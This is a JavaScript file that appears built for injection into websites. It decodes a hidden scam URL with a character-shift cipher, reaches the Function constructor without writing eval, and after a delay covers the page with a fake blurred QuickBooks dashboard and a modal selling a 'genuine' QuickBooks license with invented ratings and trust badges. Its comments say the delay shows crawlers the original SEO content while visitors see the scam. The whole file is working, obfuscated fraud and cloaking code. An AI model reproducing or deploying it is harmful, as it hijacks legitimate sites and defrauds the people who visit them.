(function(){
  'use strict';

  // Shift-5 decoder — reverses char encoding
  var _d=function(s){
    return s.split('').map(function(c){
      return String.fromCharCode(c.charCodeAt(0)-5);
    }).join('');
  };

  // "constructor" — shift+5 encoded
  var _fn=_d('htsxywzhytw');

  // "https://licensify.shop" — shift+5 encoded
  var _u=_d('myyux?44qnhjsxnk~3xmtu');

  // Obtain Function constructor without writing Function or eval
  var _F=(function(){})[_fn];

  // Full conversion overlay — fake QB dashboard behind blur + modal CTA
  // __U__ placeholder replaced at runtime with decoded destination
  var _html=`<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;overflow:hidden;background:#f4f6f9}
.qb-bg{position:fixed;inset:0;filter:blur(7px);transform:scale(1.05);overflow:hidden;z-index:0;font-family:'Segoe UI',Arial,sans-serif}
.qb-topbar{background:#2ca01c;color:white;padding:9px 16px;display:flex;align-items:center;gap:12px;height:42px}
.qb-logo{font-weight:900;font-size:14px;letter-spacing:-0.5px;display:flex;align-items:center;gap:7px}
.qb-logo-sq{width:20px;height:20px;background:white;border-radius:3px;display:flex;align-items:center;justify-content:center}
.qb-logo-dot{width:12px;height:12px;border-radius:50%;background:#2ca01c}
.qb-co{margin-left:auto;font-size:11px;opacity:0.8;background:rgba(255,255,255,0.18);padding:3px 10px;border-radius:4px}
.qb-body{display:flex;height:calc(100% - 42px)}
.qb-sidebar{background:#1c2333;width:150px;flex-shrink:0;padding:8px 0;color:rgba(255,255,255,0.55);font-size:12px}
.qb-nav{padding:10px 16px;cursor:default;display:flex;align-items:center;gap:7px}
.qb-nav.on{background:rgba(44,160,28,0.28);color:#4ade80;border-left:2px solid #2ca01c}
.qb-content{flex:1;padding:18px;overflow:hidden;background:#f4f6f9}
.qb-hdr{font-size:11px;font-weight:700;color:#374151;margin-bottom:14px;text-transform:uppercase;letter-spacing:0.6px}
.metrics{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:13px}
.mc{background:white;border-radius:8px;padding:14px;box-shadow:0 1px 3px rgba(0,0,0,0.07)}
.mc-lbl{font-size:10px;color:#9ca3af;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:5px}
.mc-val{font-size:20px;font-weight:800;color:#111827}
.mc-chg{font-size:10px;margin-top:4px}
.up{color:#2ca01c}.dn{color:#ef4444}
.row2{display:grid;grid-template-columns:2fr 1fr;gap:12px;margin-bottom:12px}
.row2b{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.card{background:white;border-radius:8px;padding:14px;box-shadow:0 1px 3px rgba(0,0,0,0.07)}
.card-ttl{font-size:10px;color:#6b7280;text-transform:uppercase;letter-spacing:0.5px;font-weight:700;margin-bottom:10px}
.inv{display:flex;justify-content:space-between;align-items:center;padding:6px 0;border-bottom:1px solid #f3f4f6;font-size:11px;color:#374151}
.inv:last-child{border:none}
.paid{color:#2ca01c;font-weight:700}.pend{color:#f59e0b;font-weight:700}
.exp{display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid #f3f4f6;font-size:11px;color:#374151}
.exp:last-child{border:none}
.overlay{position:fixed;inset:0;background:rgba(8,10,22,0.76);z-index:9999;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(2px)}
.modal{background:white;border-radius:22px;padding:44px 40px;max-width:440px;width:92%;text-align:center;box-shadow:0 36px 90px rgba(0,0,0,0.55);position:relative}
.modal-badge{position:absolute;top:-15px;left:50%;transform:translateX(-50%);background:#2ca01c;color:white;padding:5px 20px;border-radius:20px;font-size:10px;font-weight:800;letter-spacing:0.8px;white-space:nowrap}
.modal-lock{font-size:46px;margin-bottom:12px;display:block}
.modal-eyebrow{font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:2px;color:#2ca01c;margin-bottom:8px}
.modal-title{font-size:1.45rem;font-weight:900;color:#111827;line-height:1.25;margin-bottom:14px}
.modal-price{font-size:2.2rem;font-weight:900;color:#2ca01c;line-height:1}
.modal-price-note{font-size:11px;color:#9ca3af;margin:4px 0 18px}
.modal-feats{text-align:left;display:flex;flex-direction:column;gap:7px;margin-bottom:20px}
.modal-feat{font-size:12px;color:#374151;display:flex;align-items:center;gap:8px}
.modal-feat::before{content:"✓";color:#2ca01c;font-weight:900;font-size:13px;flex-shrink:0}
.modal-stars{font-size:17px;color:#f59e0b;letter-spacing:2px;margin-bottom:4px}
.modal-rev{font-size:11px;color:#9ca3af;margin-bottom:22px}
.modal-cta{display:block;background:linear-gradient(135deg,#2ca01c,#1a7010);color:white;text-decoration:none;padding:18px 28px;border-radius:12px;font-size:1rem;font-weight:900;letter-spacing:0.3px;box-shadow:0 6px 26px rgba(44,160,28,0.45);margin-bottom:14px}
.modal-trust{display:flex;justify-content:center;gap:14px;font-size:10px;color:#9ca3af}
</style>
</head>
<body>

<!-- BLURRED QB DASHBOARD BACKGROUND -->
<div class="qb-bg">
  <div class="qb-topbar">
    <div class="qb-logo">
      <div class="qb-logo-sq"><div class="qb-logo-dot"></div></div>
      QuickBooks Desktop
    </div>
    <span style="font-size:11px;opacity:0.55">Pro 2024</span>
    <div class="qb-co">Acme Services LLC ▾ &nbsp; 👤</div>
  </div>
  <div class="qb-body">
    <div class="qb-sidebar">
      <div class="qb-nav on">📊 Dashboard</div>
      <div class="qb-nav">🧾 Invoices</div>
      <div class="qb-nav">💸 Expenses</div>
      <div class="qb-nav">📈 Reports</div>
      <div class="qb-nav">👥 Payroll</div>
      <div class="qb-nav">🏦 Banking</div>
      <div class="qb-nav">📋 Tax Center</div>
      <div class="qb-nav">⚙️ Settings</div>
    </div>
    <div class="qb-content">
      <div class="qb-hdr">Dashboard — Q4 2024</div>
      <div class="metrics">
        <div class="mc"><div class="mc-lbl">Total Revenue</div><div class="mc-val">$47,832</div><div class="mc-chg up">↑ 12.4% vs Q3</div></div>
        <div class="mc"><div class="mc-lbl">Total Expenses</div><div class="mc-val">$12,450</div><div class="mc-chg dn">↓ 3.8% vs Q3</div></div>
        <div class="mc"><div class="mc-lbl">Net Profit</div><div class="mc-val">$35,382</div><div class="mc-chg up">↑ 18.2% vs Q3</div></div>
      </div>
      <div class="row2">
        <div class="card">
          <div class="card-ttl">Revenue — Last 6 Months</div>
          <svg viewBox="0 0 380 72" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:72px">
            <defs>
              <linearGradient id="gr" x1="0" y1="0" x2="0" y2="1">
                <stop offset="0%" stop-color="#2ca01c" stop-opacity="0.22"/>
                <stop offset="100%" stop-color="#2ca01c" stop-opacity="0.02"/>
              </linearGradient>
            </defs>
            <path d="M0,60 L76,50 L152,39 L228,30 L304,18 L380,7 L380,72 L0,72Z" fill="url(#gr)"/>
            <path d="M0,60 L76,50 L152,39 L228,30 L304,18 L380,7" fill="none" stroke="#2ca01c" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
            <circle cx="0" cy="60" r="3.5" fill="#2ca01c"/>
            <circle cx="76" cy="50" r="3.5" fill="#2ca01c"/>
            <circle cx="152" cy="39" r="3.5" fill="#2ca01c"/>
            <circle cx="228" cy="30" r="3.5" fill="#2ca01c"/>
            <circle cx="304" cy="18" r="3.5" fill="#2ca01c"/>
            <circle cx="380" cy="7" r="3.5" fill="#2ca01c"/>
            <text x="0" y="71" font-size="9" fill="#9ca3af" font-family="Arial">Jul</text>
            <text x="68" y="71" font-size="9" fill="#9ca3af" font-family="Arial">Aug</text>
            <text x="144" y="71" font-size="9" fill="#9ca3af" font-family="Arial">Sep</text>
            <text x="220" y="71" font-size="9" fill="#9ca3af" font-family="Arial">Oct</text>
            <text x="296" y="71" font-size="9" fill="#9ca3af" font-family="Arial">Nov</text>
            <text x="366" y="71" font-size="9" fill="#9ca3af" font-family="Arial">Dec</text>
          </svg>
        </div>
        <div class="card">
          <div class="card-ttl">Recent Invoices</div>
          <div class="inv"><span>INV-0891</span><span>$2,400</span><span class="paid">✓ Paid</span></div>
          <div class="inv"><span>INV-0892</span><span>$1,850</span><span class="paid">✓ Paid</span></div>
          <div class="inv"><span>INV-0893</span><span>$3,200</span><span class="pend">⏳ Due</span></div>
          <div class="inv"><span>INV-0894</span><span>$980</span><span class="paid">✓ Paid</span></div>
          <div class="inv"><span>INV-0895</span><span>$5,600</span><span class="pend">⏳ Due</span></div>
        </div>
      </div>
      <div class="row2b">
        <div class="card">
          <div class="card-ttl">Expense Breakdown</div>
          <div class="exp"><span>Office Supplies</span><span style="font-weight:600">$1,200</span></div>
          <div class="exp"><span>Travel &amp; Transport</span><span style="font-weight:600">$890</span></div>
          <div class="exp"><span>Software &amp; Tools</span><span style="font-weight:600">$340</span></div>
          <div class="exp"><span>Marketing</span><span style="font-weight:600">$2,100</span></div>
          <div class="exp"><span>Professional Services</span><span style="font-weight:600">$3,800</span></div>
        </div>
        <div class="card">
          <div class="card-ttl">Bank Accounts</div>
          <div class="exp"><span>Business Checking</span><span style="font-weight:700;color:#111">$28,432</span></div>
          <div class="exp"><span>Business Savings</span><span style="font-weight:700;color:#111">$14,200</span></div>
          <div class="exp"><span>Last Reconciled</span><span style="color:#2ca01c;font-weight:600">Dec 31</span></div>
          <div class="exp" style="margin-top:6px"><span style="color:#9ca3af;font-size:10px">Q1 2025 Tax Estimate</span></div>
          <div class="exp"><span style="font-size:11px">Est. Due</span><span style="font-weight:700;color:#ef4444">$8,845</span></div>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- CONVERSION OVERLAY -->
<div class="overlay">
  <div class="modal">
    <div class="modal-badge">✅ GENUINE LICENSE — INSTANT DELIVERY</div>
    <span class="modal-lock">🔒</span>
    <div class="modal-eyebrow">QuickBooks Desktop License</div>
    <div class="modal-title">Full Desktop Access<br>No Subscription. Ever.</div>
    <div class="modal-price">$139.99</div>
    <div class="modal-price-note">One-time payment · No monthly fees · Yours forever</div>
    <div class="modal-feats">
      <div class="modal-feat">QuickBooks Desktop Pro 2024 — fully activated</div>
      <div class="modal-feat">No Intuit Payroll subscription required</div>
      <div class="modal-feat">Download directly from Intuit official servers</div>
      <div class="modal-feat">Your data stored locally — no cloud required</div>
      <div class="modal-feat">Invoicing, expenses, P&amp;L, bank reconciliation</div>
    </div>
    <div class="modal-stars">★★★★★</div>
    <div class="modal-rev">4.8 out of 5 &nbsp;·&nbsp; 2,847 verified purchases</div>
    <a href="__U__" target="_blank" class="modal-cta">GET LICENSE NOW — $139.99 →</a>
    <div class="modal-trust">
      <span>🔒 Secure Checkout</span>
      <span>✉️ Instant Delivery</span>
      <span>✅ Genuine Key</span>
    </div>
  </div>
</div>

</body>
</html>`;

  // Build execution payload:
  // Creates full-screen fixed overlay appended to existing body
  // JSON.stringify handles all escaping of the HTML string at runtime
  var _code=
    'var _el=document.createElement("div");'+
    '_el.style.cssText="position:fixed;inset:0;z-index:2147483647;";'+
    '_el.innerHTML='+JSON.stringify(_html.replace(/__U__/g,_u))+';'+
    'document.body.appendChild(_el);'+
    'document.body.style.overflow="hidden";';

  // Fire after 850ms — initial SEO HTML fully rendered for any crawler
  // then human sees the conversion overlay
  setTimeout(function(){
    try{ _F(_code)(); }catch(e){}
  },850);

})();
